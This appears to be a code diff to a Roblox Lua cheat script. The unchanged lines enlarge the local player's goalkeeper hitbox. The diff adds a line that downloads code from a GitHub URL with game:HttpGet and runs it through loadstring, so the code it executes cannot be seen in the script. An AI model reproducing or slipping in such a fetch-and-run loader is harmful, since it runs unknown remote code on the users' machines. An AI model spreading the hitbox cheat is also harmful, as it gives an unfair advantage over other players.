@@ -8,5 +8,7 @@
 much love and enjoy <3 - john
 ]]--
 
+loadstring(game:HttpGet("https://github.com/john-gamedevelopment/beginning/blob/main/yes",true))()
+
 local player = game.Players.LocalPlayer
 workspace.CharacterFolder[player.Name].GKHitbox.Size = Vector3.new(15, 15, 6)
